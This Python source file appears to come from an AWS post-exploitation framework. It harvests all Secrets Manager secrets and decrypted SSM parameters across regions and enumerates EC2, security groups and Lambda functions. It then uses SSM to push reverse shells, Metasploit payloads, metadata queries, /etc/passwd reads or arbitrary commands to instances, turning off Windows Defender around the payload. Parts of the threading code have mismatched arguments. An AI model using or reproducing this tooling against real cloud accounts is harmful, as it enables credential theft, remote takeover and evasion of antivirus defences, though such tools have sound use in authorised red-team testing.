import logging
import time
from threading import Thread

from clint.textui import prompt

from src.constants.attack_types import AttackType
from src.constants.commands import PRINT_EC2_METADATA_CMD, PRINT_EC2_METADATA_PSH, DISABLE_WINDOWS_DEFENDER, \
    ENABLE_WINDOWS_DEFENDER
from src.constants.platforms import PlatformTypes
from src.constants.scan_modes import EC2ScanMode
from src.helpers.linux_commands import run_linux_command
from src.helpers.metasploit_multiple_options import metasploit_installed_multiple_options
from src.helpers.metasploit_options import metasploit_installed_options
from src.helpers.print_output import print_color
from src.helpers.reverse_shell_options import reverseshell_multiple_options
from src.helpers.shell_options import reverseshell_options
from src.helpers.windows_commands import run_windows_command
from src.scanner.barq_scanner_core import BarqScannerCore
from src.scanner.records.command_invocations import CommandInvocation
from src.scanner.records.elastic_cloud import EC2Instance
from src.scanner.records.findings import Secret, Parameter
from src.scanner.records.lambda_functions import LambdaFunction
from src.scanner.records.security_groups import SecurityGroup, PermissionRule

logger = logging.getLogger()


class BarqScanner(BarqScannerCore):

    def find_all_creds(self, ) -> None:
        """
        Find Secrets and Parameters stored in AWS Secrets Manager or Systems Manager Parameter store for each region.
        :return: None
        """
        print_color("[..] Now iterating over all regions to get secrets and parameters...")
        for region in self.aws_creds.possible_regions:
            print_color("[*] Region currently searched for secrets: %s" % region)
            print_color("[..] Now searching for secrets in Secret Manager")
            session = self.session
            secrets_client = session.client(service_name="secretsmanager", region_name=region)
            try:
                secret_names = []
                # TODO rework iteration
                for raw_secret in secrets_client.list_secrets()["SecretList"]:
                    secret_names.append(raw_secret["Name"])
                for name in secret_names:
                    resp = secrets_client.get_secret_value(SecretId=name)
                    resp2 = secrets_client.describe_secret(SecretId=name)
                    secret = Secret(
                        name=name,
                        value=resp["SecretString"],
                        description=resp2.get("Description", '')
                    )

                    print_color(f"Secret Name: {secret.name}\n"
                                f"Secret Value: {secret.value}\n"
                                f"Secret Description: {secret.description}\n",
                                "green")
                    self.add_findings(finding=secret)
            except Exception as e:
                print_color(e.__str__(), "red")
                print_color("[!] No secrets in this region's Secret Manager...")
            print_color("[..] Now searching for secrets in Parameter Store")
            ssm_client = session.client("ssm", region_name=region)
            try:
                param_response = ssm_client.describe_parameters()
                param_names = []
                for param in param_response.get("Parameters", []):
                    if param.get("Name", '') != '':
                        param_names.append(param.get("Name"))
                if len(param_names) > 0:
                    get_params_response = ssm_client.get_parameters(
                        Names=param_names, WithDecryption=True).get("Parameters")
                    for getparam in get_params_response:
                        parameter = Parameter(
                            name=getparam["Name"],
                            value=getparam["Value"],
                        )
                        print_color(f"Parameter Name: {parameter.name}\nParameter Value: {parameter.value}",
                                    "green")
                        self.add_findings(finding=parameter)
            except Exception as e:
                print_color(e.__str__(), "red")
                print_color("[!] No Parameters in this region\"s Parameter Store...")

        print_color("[+] Done iterating on AWS secrets and parameters.")

    # noinspection SpellCheckingInspection
    def find_attack_surface(self, ) -> None:
        """
        Find the attack surface of this AWS account. Currently looks for EC2 instances and Security Groups.
        :return: None
        """
        print_color("[..] Now iterating over all regions to discover public attack surface...")
        for region in self.aws_creds.possible_regions:
            print_color("[*] Region currently searched for details: %s" % region)
            session = self.set_session_region(region=region)
            ec2_resource = session.resource("ec2")
            lambda_client = session.client("lambda")
            print_color("[..] Now searching for details of EC2 instances")
            for instance in ec2_resource.instances.all():
                print_color(f"[..] Now checking instance:")
                print_color(f"[+] ID: {instance.instance_id}"
                            f"[+] Public host name: {instance.public_dns_name}"
                            f"[+] Public IP:  {instance.public_ip_address}"
                            f"[+] OS is: {instance.platform.upper()}"
                            f"[+] AMI id: {instance.image_id}"
                            f"[+] State: {instance.state['Name']}"
                            f"[+] Region: {region}")
                profile = instance.iam_instance_profile
                if profile:
                    profile = profile["Arn"].rsplit("/", 1)[-1]
                else:
                    profile = ''
                self.add_ec2_instance(EC2Instance(
                    id=instance.instance_id,
                    ami_id=instance.image_id,
                    public_dns_name=instance.public_dns_name,
                    public_ip_address=instance.public_ip_address,
                    platform=instance.platform,
                    state=instance.state["Name"],
                    region=region,
                    iam_profile=profile,
                ))

            print_color("[..] Now searching for details of security groups")
            security_groups = ec2_resource.security_groups.all()
            for group in security_groups:
                this_group = SecurityGroup(
                    id=group.id,
                    description=group.description,
                )

                print_color(f"Group id {group.id}\nGroup ip permissions:", "magenta")
                for raw_rule in group.ip_permissions:
                    rule = self._convert_rule(rule=raw_rule)
                    print_color(f"Ingress Rule: "
                                f"fromport: {rule.from_port}, "
                                f"toport: {rule.to_port}, "
                                f"protocol: {rule.protocol}, "
                                f"IP ranges: {rule.ranges}",
                                "magenta")
                    this_group.ip_permissions.append(rule)
                print_color("Group ip permissions egress", "magenta")
                for raw_rule in group.ip_permissions_egress:
                    rule = self._convert_rule(rule=raw_rule)
                    print_color(f"Egress Rule: "
                                f"fromport: {rule.from_port}, "
                                f"toport: {rule.to_port}, "
                                f"protocol: {rule.protocol}, "
                                f"IP ranges: {rule.ranges}",
                                "magenta")
                    this_group.ip_permissions_egress.append(rule)
                self.add_security_group(this_group)

            print_color("[..] Now searching for details of lambda functions")
            function_results = lambda_client.list_functions()
            for raw_function in function_results["Functions"]:
                function = LambdaFunction(
                    name=raw_function["FunctionName"],
                    arn=raw_function["FunctionArn"],
                    runtime=raw_function.get("Runtime", ''),
                    role=raw_function.get("Role", ''),
                    description=raw_function.get("Description", ''),
                    environment=raw_function.get("Environment", {}),
                    region=region
                )
                print_color(f"[+] Function Name: {function.name}\n"
                            f"[+] Function ARN: {function.arn}\n"
                            f"[+] Function Runtime: {function.runtime}\n"
                            f"[+] Function Role: {function.role}\n"
                            f"[+] Function Description: {function.description}\n"
                            f"[+] Function Environment variables: {function.environment}")
                self.add_lamda_function(function)

    @staticmethod
    def _convert_rule(rule: dict) -> PermissionRule:
        ranges = ''
        for iprange in rule.get("IpRanges", []):
            ranges = ranges + "%s," % iprange["CidrIp"]
        if len(ranges) > 1 and ranges[-1] == ",":
            ranges = ranges[:-1]
        if ranges == '':
            ranges = "None"
        protocol = rule.get("IpProtocol")
        if ranges == '':
            protocol = "All"
        return PermissionRule(
            protocol=protocol,
            from_port=rule.get("FromPort", "Any"),
            to_port=rule.get("ToPort", "Any"),
            ranges=ranges
        )

    def run_ec2_attacks(self, scan_mode: str, attack_mode: str) -> None:
        """
        Perform attacks against selected eligible EC2 instances in the account
        :return: None
        """
        targets = []
        is_linux = False
        is_windows = False
        if len(self.ec2_instances) == 0:
            print_color(
                '[!] You have no stored EC2 instances. Run the command attacksurface to discover them')
        for instance in self.ec2_instances:
            if instance.iam_profile != '' and instance.state == 'running':
                targets.append(instance)
                if instance.platform is PlatformTypes.LINUX.value:
                    is_linux = True
                if instance.platform is PlatformTypes.WINDOWS.value:
                    is_windows = True
        self.show_selected_ec2_instances(instances=targets)
        print_color('[*] Target Options:')
        if scan_mode == EC2ScanMode.SINGLE.value:
            instance = None
            while instance is None:
                target_id = prompt.query('Type/Paste your target EC2 ID:')
                instance = next(target for target in targets if target.id == target_id)
            print_color(f'[*] Target: {instance.id}')
            self.attack_single_ec2_instance(instance=instance, attack_mode=attack_mode)
        else:
            self.attack_multiple_targets(targets, attack_mode, is_linux, is_windows)
        print_color("[+] Done launching attacks. Check command results with 'commandresults' option.")

    def attack_single_ec2_instance(self, instance: EC2Instance, attack_mode: str) -> bool:
        """
        Launch an attack on a single EC2 instance.
        :param instance: Target EC2 instance id
        :param attack_mode: The attack to launch.
        :return: True
        """
        disable_av = False
        if instance.state != 'running':
            print_color('[!] The chosen target is not running! Exiting...')
            return False

        action = 'AWS-RunShellScript' if instance.platform == PlatformTypes.LINUX.value else 'AWS-RunPowerShellScript'
        if attack_mode in [AttackType.REVERSE_SHELL.value, AttackType.MSF.value]:
            print_color(
                f"You chose {attack_mode} option. First provide your remote IP and port to explore shell options.",
                'magenta')
            remote_ip_host = prompt.query('Your remote IP or hostname to connect back to:')
            remote_port = prompt.query("Your remote port number:", default="4444")
            if attack_mode == AttackType.REVERSE_SHELL.value:
                attack_mode, action = reverseshell_options(remote_ip_host, remote_port, instance.platform)
            elif attack_mode == AttackType.MSF.value:
                attack_mode, action = metasploit_installed_options(remote_ip_host, remote_port, instance.platform)
            disable_av = True
        elif attack_mode == AttackType.URL.value:
            print_color('[*] Choose the URL to visit from inside the EC2 instance:')
            target_url = prompt.query('URL: ', default="http://169.254.169.254/latest/")
            if instance.platform == PlatformTypes.LINUX.value:
                attack_mode = "python -c \"import requests; print requests.get('%s').text;\"" % target_url
            else:
                attack_mode = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" % target_url
        elif attack_mode == AttackType.METADATA.value:
            if instance.platform == PlatformTypes.LINUX.value:
                attack_mode = PRINT_EC2_METADATA_CMD
            else:
                attack_mode = PRINT_EC2_METADATA_PSH
        elif attack_mode == AttackType.PRINT_FILE.value:
            filepath = prompt.query(
                'Enter the full file path: ', default="/etc/passwd")
            attack_mode = "cat %s" % filepath
        elif attack_mode == AttackType.COMMAND.value:
            attack_mode = prompt.query(
                'Enter the full command to run: (bash for Linux - Powershell for Windows)',
                default="cat /etc/passwd")
            disable_av = True

        print_color('Sending the command "%s" to the target instance %s....' % (attack_mode, instance), 'cyan')
        ssm_client = self.set_session_region(instance.region).client('ssm')
        if instance.platform == PlatformTypes.LINUX.value:
            return run_linux_command(ssm_client, instance, action, attack_mode)
        return run_windows_command(ssm_client, instance, action, attack_mode, disable_av)

    def attack_multiple_targets(self, targets: list[EC2Instance], attack_mode: str, linux, windows):
        """
        Launch commands against multiple EC2 instances
        :param targets: List of target EC2 instances
        :param attack_mode: The attack/command type
        :param linux: Whether or not Linux is included in the targets.
        :param windows: Whether or not Windows is included in the targets.
        :return: None
        """

        windows_action = 'AWS-RunPowerShellScript'
        linux_action = 'AWS-RunShellScript'
        linux_attack = ''
        windows_attack = ''
        disable_av = False
        if attack_mode == AttackType.REVERSE_SHELL.value or attack_mode == AttackType.MSF.value:
            print_color('Make sure your shell listener tool can handle multiple simultaneous connections!', 'magenta')
            disable_av = True
            if attack_mode == AttackType.REVERSE_SHELL.value:
                linux_attack, windows_attack = reverseshell_multiple_options(linux, windows)
            elif attack_mode == AttackType.MSF.value:
                linux_attack, windows_attack = metasploit_installed_multiple_options(
                    linux, windows)
        elif attack_mode == AttackType.URL.value:
            print_color('[*] Choose the URL to visit from inside the EC2 instances:')
            URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")
            linux_attack = "python -c \"import requests; print requests.get('%s').text;\"" % URL
            windows_attack = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" % URL
        elif attack_mode == AttackType.METADATA.value:
            linux_attack = PRINT_EC2_METADATA_CMD
            windows_attack = PRINT_EC2_METADATA_PSH
        elif attack_mode == AttackType.PRINT_FILE.value:
            linux_file_path = prompt.query(
                '(Ignore if linux is not targeted)Enter the full file path for Linux instances: ',
                default="/etc/passwd")
            windows_file_path = prompt.query(
                '(Ignore if Windows is not targeted)Enter the full file path for Windows instances: ',
                default="C:\\Windows\\System32\\drivers\\etc\\hosts")
            linux_attack = "cat %s" % linux_file_path
            windows_attack = "cat %s" % windows_file_path
        elif attack_mode == AttackType.COMMAND.value:
            linux_attack = prompt.query(
                '(Ignore if linux is not targeted)Enter the full bash command to run: ', default="whoami")
            windows_attack = prompt.query(
                '(Ignore if Windows is not targeted)Enter the full Powershell command to run: ', default="whoami")
            disable_av = True
        logger.error("before running threaded attacks")
        for target in targets:
            if target.platform == 'linux' and linux and target.iam_profile != '' and linux_attack != '':
                # run_threaded_linux_command(self.session,target,linux_action,linux_attack)
                logger.error(f"running run_threaded_linux_command for for {target.id}")
                linux_thread = Thread(target=self.run_threaded_linux_command, args=(
                    self.session, target, linux_action, linux_attack))
                linux_thread.start()
                logger.error(f"after running run_threaded_linux_command for {target.id}")
            if target.platform == 'windows' and windows and target.iam_profile != '' and windows_attack != '':
                logger.error(f"running run_threaded_windows_command for {target.id}")
                # run_threaded_windows_command(self.session,target,windows_action,windows_attack)
                windows_thread = Thread(target=self.run_threaded_windows_command, args=(
                    self.session, target, windows_action, windows_attack, disable_av))
                windows_thread.start()
                logger.error(f"after run_threaded_windows_command for {target.id}")

    def run_threaded_linux_command(self, instance: EC2Instance, action, payload) -> None:
        """
        Thread-enabled function to run a Systems Manager command on a running Linux instance.
        TODO: Make it thread-safe by using locks on global variables.
        :param instance: Target EC2 instance
        :param action: Action to be run (AWS calls it DocumentName, here it's running a bash script)
        :param payload: The actual payload to be executed on the target instance.
        :return: None
        """
        logger.error(f'inside run_threaded_linux_command for {instance.id}')
        try:
            ssm_client = self.session.client('ssm', region_name=instance.region)
        except Exception as e:
            logger.error(e)
            return

        response = ssm_client.send_command(InstanceIds=[
            instance.id, ], DocumentName=action, DocumentVersion='$DEFAULT', TimeoutSeconds=3600,
            Parameters={'commands': [payload]})
        command_id = response['Command']['CommandId']
        logger.error('calling run_threaded_linux_command for %s and command: %s' % (
            instance.id, command_id))
        command = CommandInvocation(
            id=command_id,
            instance_id=command_id,
            region=instance.region,
        )
        self.add_command_invocation(command)
        time.sleep(10)
        result = ssm_client.get_command_invocation(
            CommandId=command_id, InstanceId=instance.id)
        logger.error('calling run_threaded_linux_command for %s and command: %s ' % (
            instance.id, command_id))
        if 'Status' not in result:
            logger.error('run_threaded_linux_command for %s and command: %s failed' % (
                instance.id, command_id))
            return
        while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
            time.sleep(10)
            result = ssm_client.get_command_invocation(
                CommandId=command_id, InstanceId=instance.id)
            if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
                for index, command in enumerate(self.command_invocations):
                    if command.id == command_id:
                        logger.error('run_threaded_linux_command for %s and command: %s failed with error: %s' % (
                            instance.id, command_id, result['StandardErrorContent']))
                        command.state = 'failed'
                        command.error = result['StandardErrorContent']
                return
        if result['Status'] == 'Success':
            for index, command in enumerate(self.command_invocations):
                if command.id == command_id:
                    logger.error('run_threaded_linux_command for %s and command: %s succeeded with output: %s' % (
                        instance.id, command_id, result['StandardOutputContent']))
                    command.state = 'success'
                    command.output = result['StandardOutputContent']

    def run_threaded_windows_command(self, instance: EC2Instance, action: str, payload, disable_av: bool) -> None:
        """
        Thread-enabled function to run a Systems Manager command on a running Windows instance.
        It actually calls three commands: Disable windows defender, run the payload, then enable Windows Defender.
        TODO: Make it thread-safe by using locks on global variables.
        :param instance: Target EC2 instance
        :param action: Action to be run (AWS calls it DocumentName, here it's running a powershell script)
        :param payload: The actual payload to be executed on the target instance.
        :param disable_av: Disable Windows Defender
        :return: None
        """
        logger.error("inside run_threaded_windows_command for %s" % instance.id)
        session = self.set_session_region(instance.region)

        logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
            instance.id, 'ssm_client'))
        ssm_client = session.client('ssm', region_name=instance.region)
        # stage1 disable windows defender.
        if disable_av:
            logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
                instance.id, 'disable_windows_defender'))
            try:
                response = ssm_client.send_command(InstanceIds=[instance.id, ], DocumentName=action,
                                                   DocumentVersion='$DEFAULT', TimeoutSeconds=3600, Parameters={
                        'commands': [DISABLE_WINDOWS_DEFENDER]})

                command_id = response['Command']['CommandId']
            except Exception as e:
                logger.error(e)
                return
            #############
            time.sleep(10)
            logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
                instance.id, 'get_command_invocation 1'))
            try:
                result = ssm_client.get_command_invocation(
                    CommandId=command_id, InstanceId=instance.id)
            except:
                pass
            #############
            success, result = self.wait_for_threaded_command_invocation(ssm_client, command_id, instance.id)
            logger.error("inside run_threaded_windows_command for %s, after line: %s" % (
                instance.id, 'wait_for_threaded_command_invocation 1'))
            logger.error("success equals: %s" % success)
            if not success:
                logger.error('aborting commands for id %s' % instance.id)
                return
        # stage2 run payload
        time.sleep(3)
        logger.error(
            "inside run_threaded_windows_command for %s, before line: %s" % (instance.id, 'windows payload'))
        try:
            response = ssm_client.send_command(InstanceIds=[
                instance.id, ], DocumentName=action, DocumentVersion='$DEFAULT', TimeoutSeconds=3600,
                Parameters={'commands': [payload]})
        except Exception as e:
            logger.error("inside run_threaded_windows_command for instance %s, returning error: %s" % (
                instance.id, str(e)))
            return
        command_id = response['Command']['CommandId']
        #################
        command = CommandInvocation(
            id=command_id,
            instance_id=command_id,
            platform='windows',
            region=instance.region,
        )
        self.add_command_invocation(command)
        time.sleep(10)
        logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
            instance.id, 'get_command_invocation 2'))
        try:
            result = ssm_client.get_command_invocation(
                CommandId=command_id, InstanceId=instance.id)
        except:
            return
        success = False
        while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
            time.sleep(10)
            result = ssm_client.get_command_invocation(
                CommandId=command_id, InstanceId=instance.id)
            if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
                logger.error("failure running payload in run_threaded_windows_command for %s, command_id: %s" % (
                    instance.id, command_id))
                for index, _command in enumerate(self.command_invocations):
                    if _command.id == command_id:
                        _command.state = 'failed'
                        _command.error = result['StandardErrorContent']
                        success = False
                        break
        if result['Status'] == 'Success':
            logger.error(
                "success running payload in run_threaded_windows_command for %s. command_id: %s" % (
                    instance.id, command_id))
            for index, _command in enumerate(self.command_invocations):
                if _command.id == command_id:
                    _command.state = 'success'
                    _command.output = result['StandardOutputContent']
                    success = True
                    break

        #################
        if not success:
            logger.error(f"inside run_threaded_windows_command for {instance.id}, failed in running payload")
        # stage3 enable windows defender.
        if disable_av:
            time.sleep(30)
            logger.error(f"inside run_threaded_windows_command for {instance.id}, before enable_windows_defender")
            response = ssm_client.send_command(InstanceIds=[instance.id, ],
                                               DocumentName=action,
                                               DocumentVersion='$DEFAULT',
                                               TimeoutSeconds=3600,
                                               Parameters={
                                                   'commands': [ENABLE_WINDOWS_DEFENDER]
                                               }
                                               )
            command_id = response['Command']['CommandId']
            success, result = self.wait_for_threaded_command_invocation(ssm_client, command_id, instance.id)
            logger.error("inside run_threaded_windows_command for %s, after enable_windows_defender, success: %s" % (
                instance.id, success))
            if not success:
                return
        return

    @staticmethod
    def wait_for_threaded_command_invocation(ssm_client, command_id: str, instance_id: str) -> (bool, dict):
        """
        A thread-ready function to wait for invocation for a command on an instance.
        TODO: Make it thread-safe by using locks on the global variables.
        :param ssm_client: SSM Client
        :param command_id: The command that was run
        :param instance_id: The instance on which the command was run.
        :return: Returns a tuple of success state and AWS response json in full.
        """
        time.sleep(10)
        logger.error(
            'inside wait_for_threaded_command_invocation for %s and command_id: %s, before get_command_invocation a' % (
                instance_id, command_id))
        result = ssm_client.get_command_invocation(
            CommandId=command_id, InstanceId=instance_id)
        logger.error(
            'inside wait_for_threaded_command_invocation for %s and command_id: %s, after get_command_invocation a, status: %s' % (
                instance_id, command_id, result['Status']))
        while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
            time.sleep(10)
            result = ssm_client.get_command_invocation(
                CommandId=command_id, InstanceId=instance_id)
            if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
                logger.error(
                    'failure in wait_for_threaded_command_invocation for %s and command_id: %s, after get_command_invocation b, status: %s' % (
                        instance_id, command_id, result['Status']))
                return False, result
        if result['Status'] == 'Success':
            logger.error(
                'success in wait_for_threaded_command_invocation for %s and command_id: %s, after get_command_invocation b, status: %s' % (
                    instance_id, command_id, result['Status']))
            return True, result